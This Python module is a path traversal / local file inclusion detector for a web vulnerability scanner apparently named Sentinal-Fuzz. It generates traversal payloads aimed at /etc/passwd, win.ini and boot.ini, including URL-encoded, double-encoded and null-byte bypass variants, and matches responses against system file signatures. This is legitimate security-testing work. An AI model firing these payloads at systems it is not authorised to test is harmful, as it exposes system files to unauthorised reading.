"""Path Traversal / Local File Inclusion (LFI) detector for Sentinal-Fuzz.

Generates path traversal payloads (plain, URL-encoded, double-encoded)
and matches response bodies against known file content signatures
(``/etc/passwd``, ``win.ini``, ``boot.ini``).

Usage::

    detector = PathTraversalDetector()
    payloads = detector.get_payloads()
    for payload in payloads:
        # inject and check response
        evidence = detector.analyze_response(response)
"""

from __future__ import annotations

import re
from typing import TYPE_CHECKING

from sentinal_fuzz.core.models import Finding, SeverityLevel
from sentinal_fuzz.utils.logger import get_logger

if TYPE_CHECKING:
    pass

log = get_logger("detector.path_traversal")

# ── File content signatures ────────────────────────────────────────
_LINUX_SIGNATURES: list[tuple[str, str]] = [
    (r"root:x:0:0:", "/etc/passwd"),
    (r"root:.*?:0:0:", "/etc/passwd"),
    (r"daemon:.*?:1:1:", "/etc/passwd"),
    (r"bin:.*?:2:2:", "/etc/passwd"),
    (r"nobody:.*?:\d+:\d+:", "/etc/passwd"),
    (r"127\.0\.0\.1\s+localhost", "/etc/hosts"),
]

_WINDOWS_SIGNATURES: list[tuple[str, str]] = [
    (r"\[fonts\]", "win.ini"),
    (r"\[extensions\]", "win.ini"),
    (r"\[mci extensions\]", "win.ini"),
    (r"for 16-bit app support", "win.ini"),
    (r"\[boot loader\]", "boot.ini"),
    (r"\[operating systems\]", "boot.ini"),
]

# ── Base traversal sequences ──────────────────────────────────────
_LINUX_TARGETS = [
    "../../../../../../../../etc/passwd",
    "../../../../../../../etc/passwd",
    "../../../../../../etc/passwd",
    "../../../../../etc/passwd",
    "../../../../etc/passwd",
    "../../../../../../../../etc/hosts",
]

_WINDOWS_TARGETS = [
    r"..\..\..\..\..\..\..\..\windows\win.ini",
    r"..\..\..\..\..\..\..\windows\win.ini",
    r"..\..\..\..\..\..\windows\win.ini",
    r"..\..\..\..\..\windows\win.ini",
    r"..\..\..\..\windows\win.ini",
    r"..\..\..\..\..\..\..\..\boot.ini",
]


def _url_encode(payload: str) -> str:
    """URL-encode dots and slashes in a traversal payload."""
    return payload.replace(".", "%2e").replace("/", "%2f").replace("\\", "%5c")


def _double_encode(payload: str) -> str:
    """Double-URL-encode dots and slashes."""
    return payload.replace(".", "%252e").replace("/", "%252f").replace("\\", "%255c")


class PathTraversalDetector:
    """Detect path traversal and local file inclusion vulnerabilities.

    Generates plain, URL-encoded, and double-encoded traversal payloads
    targeting common OS files, then matches responses against known
    file content signatures.
    """

    @staticmethod
    def get_payloads() -> list[str]:
        """Return all path traversal payloads including encoded variants."""
        payloads: list[str] = []

        for target in _LINUX_TARGETS:
            payloads.append(target)
            payloads.append(_url_encode(target))
            payloads.append(_double_encode(target))

        for target in _WINDOWS_TARGETS:
            payloads.append(target)
            payloads.append(_url_encode(target))

        # Null-byte bypass (legacy PHP / older stacks)
        payloads.append("../../../../../../../../etc/passwd%00")
        payloads.append("../../../../../../../../etc/passwd\x00.jpg")

        return payloads

    @staticmethod
    def analyze_response(response_text: str) -> list[str]:
        """Scan a response body for file content signatures.

        Returns:
            A list of evidence strings describing what was found.
        """
        evidence: list[str] = []

        for pattern, source_file in _LINUX_SIGNATURES:
            match = re.search(pattern, response_text)
            if match:
                snippet = match.group()[:80]
                evidence.append(f"Linux file ({source_file}): {snippet}")

        for pattern, source_file in _WINDOWS_SIGNATURES:
            match = re.search(pattern, response_text, re.IGNORECASE)
            if match:
                snippet = match.group()[:80]
                evidence.append(f"Windows file ({source_file}): {snippet}")

        return evidence

    @staticmethod
    def create_finding(
        url: str,
        parameter: str,
        payload: str,
        evidence: list[str],
    ) -> Finding:
        """Build a Path Traversal Finding."""
        return Finding(
            title="Path Traversal / Local File Inclusion",
            severity=SeverityLevel.HIGH,
            url=url,
            parameter=parameter,
            payload=payload,
            evidence=" | ".join(evidence)[:200],
            cwe="CWE-22",
            owasp="A01:2021-Broken Access Control",
            remediation=(
                "Validate and sanitise file path input. Use an allow-list of "
                "permitted file names. Resolve symbolic links and ensure the "
                "canonical path stays within the intended directory. Never "
                "pass raw user input to file-system APIs."
            ),
            confidence=0.9 if len(evidence) >= 2 else 0.7,
            template_id="path-traversal-detector",
        )
